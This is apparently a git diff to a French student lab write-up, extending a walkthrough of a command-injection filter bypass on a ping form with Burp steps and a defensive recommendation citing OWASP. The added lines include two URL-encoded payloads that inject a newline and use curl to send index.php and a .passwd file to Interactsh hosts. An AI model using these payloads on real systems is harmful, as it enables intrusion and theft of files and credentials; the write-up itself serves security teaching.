@@ -5,6 +5,11 @@
 - LOUNADI Nassim
 - DEHIL Sami
 - BATISTA Maxime
+- COUVIDOU Guillaume
+
+## Repo
+
+[Lien](https://github.com/nassimlnd/ci-cd)
 
 ## Screenshots
 
@@ -351,8 +356,9 @@ Pour se protéger contre cette vulnérabilité, il serait judicieux d'utiliser u
 
 Il est possible de renseigner un host à ping, on peut donc essayer d'injecter une commande annexe pour l'exécuter sur le serveur cible.
 
-- Utilisation du repeater de Burp
-- Construction de la commande à executer avec curl et le flag '--data' (envoyer un fichier sur un serveur distant).
+- Mettre un host et submit le formulaire
+- Utilisation du repeater de Burp sur la requête POST
+- Construction de la commande à executer avec curl et le flag '--data' (envoyer le contenu d'un fichier sur un serveur distant).
 - Utilisation d'un serveur Interactsh pour recevoir le contenu du fichier.
 - Echapement des espaces avec '%20'
 - Essaie de plusiers caractères ASCII encodés pour chainer ([ ;, &, | ])
@@ -362,11 +368,27 @@ Il est possible de renseigner un host à ping, on peut donc essayer d'injecter u
 
 ![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/8_injection_de_commande_contournement_de_filtre/2.png)
 
+Payload :
+
+```bash
+google.com%0acurl%20-X%20POST%20axdfenolaqijecgpnjnhl5gur6fexltfl.oast.fun%20--data%20%22%40index.php%22
+```
+
+On remarque la présence d'un fichier '.passwd', on applique la même technique pour le récupéré.
+
 ![Step 3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/8_injection_de_commande_contournement_de_filtre/3.png)
 
 ![Step 4](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/8_injection_de_commande_contournement_de_filtre/4.png)
 
-Pour se protéger contre cette vulnérabilité, il faudrait aussi filtrer "\n", 
+Payload :
+
+```bash
+google.com%0acurl%20-X%20POST%20dxmvjgheeljbwmrmldrddmlkzc5ijlcrj.oast.fun%20--data%20%22%40.passwd%22
+```
+
+Pour se protéger contre cette vulnérabilité, il faudrait améliorer le filtrage, et / ou utiliser des fonctions sécurisées native du langage pour exécuter des commandes systèmes.
+
+[Source](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#primary-defenses)
 
 ### 9 |
 
